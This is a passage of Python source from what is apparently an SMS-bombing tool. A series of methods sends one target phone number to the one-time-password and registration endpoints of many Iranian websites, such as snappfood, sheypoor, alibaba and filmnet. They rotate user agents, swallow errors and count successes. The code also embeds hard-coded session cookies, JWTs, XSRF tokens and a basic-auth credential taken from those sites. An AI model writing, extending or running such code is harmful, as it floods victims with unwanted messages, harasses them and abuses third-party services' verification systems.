eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ','content-type': 'application/x-www-form-urlencoded','cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0','origin': 'https://snappfood.ir', 'referer': 'https://snappfood.ir/','user-agent': choice(self.u_a)}
            sfoodR = post(timeout=5, url='https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa', headers=sfoodH, data={"cellphone": "0"+self.number}).json()
            if sfoodR['status'] == True:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_37(self):
        try:
            sheyporH = {"Host": "www.sheypoor.com","User-Agent": choice(self.u_a),"Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "62","Origin": "https://www.sheypoor.com","Connection": "keep-alive","Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1","TE": "Trailers"}
            sheyporR = post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data={"username" : "0"+self.number}).json()
            if sheyporR['success'] == True:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_38(self):
        try:
            okH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8', 'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D','origin': 'https://my.okcs.com','referer': 'https://my.okcs.com/','user-agent': choice(self.u_a), 'x-requested-with': 'XMLHttpRequest','x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
            okR = post(timeout=5, url='https://my.okcs.com/api/check-mobile', headers=okH, json={"mobile": "0"+self.number,"g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"}).text
            if 'success' in okR:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_39(self):
        try:
            alibabaH = {"Host": "ws.alibaba.ir","User-Agent": choice(self.u_a),"Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}    
            alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json={"phoneNumber":"0"+self.number} ).json()
            if alibabaR["result"]["success"] == True:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_40(self):
        try:
            smarketH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9', 'content-type': 'text/plain;charset=UTF-8', 'origin': 'https://snapp.market','referer': 'https://snapp.market/','user-agent': choice(self.u_a)}
            smarketR = post(timeout=5, url=f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{self.number}', headers=smarketH).json()
            if smarketR['status'] == True:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_41(self):
        try:
            gaH = {'Accept': 'application/json, text/plain, */*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'fa','Browser': 'Opera','BrowserVersion': '82.0.4227.33','Connection': 'keep-alive','Content-Type': 'application/json', 'Host': 'core.gapfilm.ir', 'IP': '185.156.172.170', 'Origin': 'https://www.gapfilm.ir','OS': 'Linux','Referer': 'https://www.gapfilm.ir/','SourceChannel': 'GF_WebSite','User-Agent': choice(self.u_a)}
            gaR = post(timeout=5, url='https://core.gapfilm.ir/api/v3.1/Account/Login', headers=gaH, json={"Type": 3,"Username": self.number,"SourceChannel": "GF_WebSite","SourcePlatform": "desktop","SourcePlatformAgentType": "Opera","SourcePlatformVersion": "82.0.4227.33","GiftCode": None}).json()
            if gaR['Code'] == 1:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_42(self):
        try:
            sTripH = {"Host": "www.snapptrip.com","User-Agent": choice(self.u_a),"Accept": "*/*","Accept-Language": "fa","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/json; charset=utf-8","lang": "fa","X-Requested-With": "XMLHttpRequest","Content-Length": "134","Origin": "https://www.snapptrip.com","Connection": "keep-alive","Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad","TE": "Trailers"}
            sTripR = post(timeout=5, url='https://www.snapptrip.com/register', headers=sTripH, json={"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+self.number,"country_code":"+98","email":"example@gmail.com"}).json()
            if sTripR['status_code'] == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_43(self):
        try:
            fNh = {'Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','DNT': '1','X-Platform': 'Web', 'User-Agent': choice(self.u_a), 'Origin': 'https://filmnet.ir','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://filmnet.ir/', 'Accept-Language': 'fa,en-US;q=0.9,en;q=0.8','Cache-Control': 'no-cache', 'Accept-Encoding': 'gzip, deflate'}
            Filmnet = get(timeout=5, url=f"https://api-v2.filmnet.ir/access-token/users/+98{self.number}/otp", headers=fNh).json()
            if Filmnet['meta']['operation_result'] == 'success':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_44(self):
        try:
            drh = {'Connection': 'keep-alive', 'Accept': 'application/json','Authorization': 'hiToken','User-Agent': choice(self.u_a), 'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://drdr.ir', 'Referer': 'https://drdr.ir/','Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate'}
            drdr = post(timeout=5, url=f"https://drdr.ir/api/registerEnrollment/sendDisposableCode", headers=drh, params={"phoneNumber":"+98"+self.number ,"userType":"PATIENT"}).json()
            if drdr['status'] == 'success':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_45(self):
        try:
            itH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br', 'accept-language': 'fa', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://itoll.ir','referer': 'https://itoll.ir/','user-agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://app.itoll.ir/api/v1/auth/login', headers=itH, json= {'mobile': "+98"+self.number}).json()
            if ok['success'] == True:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_46(self):
        try:
            anrH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9', 'content-length': '34','content-type': 'application/json;charset=UTF-8','origin': 'https://anargift.com',  'referer': 'https://anargift.com/','user-agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://api.anargift.com/api/people/auth', headers=anrH, json={'user': "+98"+self.number, 'app_id': 99}).json()      
            if ok['status'] == True:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass


    def send_47(self):
        try:
            azkH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==','device': 'web','deviceid': '6','password': 'BimitoSecret','origin': 'https://www.azki.com', 'referer': 'https://www.azki.com/', 'user-agent': choice(self.u_a),'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE', 'username': 'BimitoClient'}
            ok = post(timeout=5, url=f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_+98{self.number}"%7D', headers=azkH).json()
            if ok["messageCode"] == 201:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_48(self):
        try:
            noH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','access-control-request-headers': 'nobat-cookie', 'access-control-request-method': 'POST', 'origin': 'https://user.nobat.ir', 'referer': 'https://user.nobat.ir/', 'user-agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://nobat.ir/api/public/patient/login/phone', headers=noH, json={'mobile':self.number}).json()
            if ok.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_49(self):
        try:
            chH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8','cookie': 'activity=%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D', 'origin': 'https://chamedoon.com', 'referer': 'https://chamedoon.com/','user-agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://chamedoon.com/api/v1/membership/guest/request_mobile_verification', headers=chH, json={"mobile": '0'+self.number,"origin": "/","referrer_id": None}).json()
            if ok["status"] == 'ok':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
        
    def send_50(self):
        try:
            bnH = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9','Access-Control-Request-Headers': 'content-type,platform','Access-Control-Request-Method': 'POST','Connection': 'keep-alive','Host': 'mobapi.banimode.com','Origin': 'https://www.banimode.com','Referer': 'https://www.banimode.com/','user-agent': choice(self.u_a)}
            ok = post(timeout=5, url='https://mobapi.banimode.com/api/v2/auth/request', headers=bnH, json={"phone": '0'+self.number}).json()
            if ok["status"] == 'success':
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
        
    def send_51(self):
        try:
            leH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0', 'Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'lendo_session=eyJpdiI6Imh2QXVnS3Q1ejFvQllhSVgzRTZORVE9PSIsInZhbHVlIjoicFE0VzJWc016a3BHXC9CRTE3S21OSXV0XC84U015VTJwdDBRVWZNUDRIUmxmS1gwSDR5NVEwQlhmaUlMdTM2XC9EQyIsIm1hYyI6ImMzMWRhYWE1ODA3MTE1ZGI5ZGIxNTAxNTg5NzBhNWYzNjZjNzk2MDNhYWNlNTU1OTc5ZTYzNjNmYWU5OGZiMWIifQ%3D%3D','Host': 'lendo.ir', 'Origin': 'https://lendo.ir','Referer': 'https://lendo.ir/register','Upgrade-Insecure-Requests': '1', 'user-agent': choice(self.u_a)}
            lendoR = post(timeout=5, url='https://lendo.ir/register?', headers=leH, data={'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6','mobile': '0'+self.number,'password': 'ibvvb@3#9nc'}).text
            if 'تایید شماره تلفن همراه' in lendoR:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_52(self):
        try:
            olH = {'Accept': 'text/plain, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '163', 'Content-Type': 'application/x-www-form-urlencoded','Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5', 'Host': 'www.olgoobooks.ir', 'Origin': 'https://www.olgoobooks.ir','Referer': 'https://www.olgoobooks.ir/sn/userRegistration/','X-Requested-With': 'XMLHttpRequest','user-agent': choice(self.u_a)}
            olgoo = post(timeout=5, url='https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox', headers=olH, data={'contactInfo[mobile]': '0'+self.number,'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'}).text
            if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
        
